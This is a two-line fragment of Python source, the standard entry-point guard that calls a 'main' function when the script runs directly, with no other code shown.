if __name__ == "__main__":
    main()